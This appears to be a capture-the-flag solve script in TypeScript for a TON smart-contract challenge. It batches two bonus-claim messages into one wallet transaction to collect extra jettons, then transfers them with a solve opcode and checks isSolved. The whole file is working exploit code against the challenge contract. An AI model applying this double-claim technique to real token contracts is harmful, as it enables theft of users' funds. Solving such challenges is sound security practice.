import { TonClient, WalletContractV3R2 } from '@ton/ton';
import { keyPairFromSeed } from '@ton/crypto';
import { Address, toNano, beginCell, SendMode, TupleItem, internal } from '@ton/core';
import * as fs from 'fs';

const SESSION_FILE = 'session.json';
interface SessionData { uuid: string; challenge: string; api: string; wallet_id: number; seed: string; }

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }

async function getJettonBal(client: TonClient, addr: Address): Promise<bigint | null> {
    try { const r = await client.runMethod(addr, 'get_wallet_data'); return r.stack.readBigNumber(); } catch { return null; }
}
async function getMinterSupply(client: TonClient, minter: Address): Promise<bigint | null> {
    try { const r = await client.runMethod(minter, 'get_jetton_data'); return r.stack.readBigNumber(); } catch { return null; }
}

async function main() {
    const s: SessionData = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf-8'));
    console.log(`UUID: ${s.uuid}`);

    const client = new TonClient({ endpoint: s.api.replace(/\/+$/, '') + '/jsonRPC', timeout: 30000 });
    const challengeAddr = Address.parse(s.challenge);
    const kp = keyPairFromSeed(Buffer.from(s.seed, 'hex'));
    const wallet = WalletContractV3R2.create({ workchain: -1, publicKey: kp.publicKey, walletId: s.wallet_id });
    const openedWallet = client.open(wallet);
    const provider = client.provider(wallet.address, wallet.init);
    console.log(`Wallet: ${wallet.address}`);

    // Get addrs
    const mr = await client.runMethod(challengeAddr, 'minter');
    const minter = mr.stack.readAddress();
    const pwc = beginCell().storeAddress(wallet.address).endCell();
    const pwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: pwc } as TupleItem]);
    const pJetton = pwr.stack.readAddress();
    const cwc = beginCell().storeAddress(challengeAddr).endCell();
    const cwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: cwc } as TupleItem]);
    const cJetton = cwr.stack.readAddress();

    console.log(`Minter: ${minter}`);
    console.log(`Player jetton: ${pJetton}`);
    console.log(`Challenge jetton: ${cJetton}`);
    console.log(`Initial TON: ${Number(await client.getBalance(wallet.address))/1e9}`);
    console.log(`Initial Jetton: ${await getJettonBal(client, pJetton)}`);
    console.log(`Initial Supply: ${await getMinterSupply(client, minter)}\n`);

    // === Key strategy: Send BOTH bonuses in ONE wallet tx ===
    const bonusBody = beginCell().storeUint(0x13370002, 32).storeUint(0, 64).endCell();

    const seqno = await wallet.getSeqno(provider);
    console.log(`Batch send both bonuses (seqno=${seqno})...`);

    await openedWallet.sendTransfer({
        seqno,
        secretKey: kp.secretKey,
        messages: [
            internal({ to: challengeAddr, value: toNano('0.25'), body: bonusBody, bounce: false }),
            internal({ to: challengeAddr, value: toNano('0.25'), body: bonusBody, bounce: false }),
        ],
        sendMode: SendMode.PAY_GAS_SEPARATELY,
    });

    console.log(`  Waiting for seqno ${seqno} → next...`);
    let ok = false;
    for (let w = 0; w < 30; w++) {
        await sleep(2000);
        const ns = await wallet.getSeqno(provider);
        if (ns > seqno) { ok = true; console.log(`  seqno → ${ns}`); break; }
    }
    if (!ok) { console.log(`  seqno stuck`); process.exit(1); }

    // Wait for state to settle
    await sleep(15000);

    let jetBal = await getJettonBal(client, pJetton);
    let supply = await getMinterSupply(client, minter);
    let tonBal = await client.getBalance(wallet.address);
    console.log(`\nAfter batch: TON=${Number(tonBal)/1e9} Jetton=${jetBal} Supply=${supply}`);

    if (jetBal === null || jetBal < 100n) {
        console.log(`\nOnly ${jetBal} jettons. Need 100.`);
        process.exit(1);
    }

    // === Transfer with Solve ===
    console.log(`\n=== Transfer ${jetBal} jettons + Solve ===`);
    const xferBody = beginCell()
        .storeUint(0x0f8a7ea5, 32).storeUint(0, 64)
        .storeCoins(jetBal).storeAddress(cJetton).storeAddress(null)
        .storeBit(0).storeCoins(toNano('0.05'))
        .storeUint(0x13370005, 32).storeUint(0, 64)
    .endCell();

    let s2 = await wallet.getSeqno(provider);
    console.log(`  seqno=${s2}, TON=${Number(tonBal)/1e9}`);
    await openedWallet.sendTransfer({
        seqno: s2, secretKey: kp.secretKey,
        messages: [internal({ to: pJetton, value: toNano('0.25'), body: xferBody, bounce: false })],
        sendMode: SendMode.PAY_GAS_SEPARATELY,
    });
    for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > s2) { console.log(`  seqno→${ns}`); break; } }
    await sleep(15000);

    // isSolved
    console.log(`\n=== isSolved ===`);
    for (let i = 0; i < 16; i++) {
        try {
            const r = await client.runMethod(challengeAddr, 'isSolved');
            if (r.stack.readBoolean()) { console.log(`\n🎉 SOLVED! 🎉\nUUID: ${s.uuid}`); process.exit(0); }
        } catch {}
        await sleep(5000);
    }
    console.log(`Not solved.`);
}
main().catch(console.error);
